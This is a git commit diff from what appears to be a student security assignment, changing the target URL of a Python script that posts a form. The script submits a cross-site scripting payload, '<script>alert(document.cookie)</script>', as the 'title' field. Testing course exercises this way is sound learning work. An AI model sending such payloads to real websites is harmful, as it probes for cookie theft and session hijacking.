49a930ec098191f62f3356ed00641a68e01f06b7
Lgmrszd <m.v.bobrov@yandex.ru>
2020-02-23 23:42:04 +0300

    fix

--- script19.py
+++ script19.py
@@ -2,7 +2,7 @@ from urllib import request, parse
 import webbrowser
 
 # base_url = "http://localhost:20080/Assignment/case04.php"
-base_url = "http://iu.ru/Assignment/case04.php"
+base_url = "http://iu.ru/Assignment/case19.php"
 values = {"title": "<script>alert(document.cookie)</script>", "content": "content"}
 data = parse.urlencode(values).encode()
 req = request.Request(base_url, data=data)
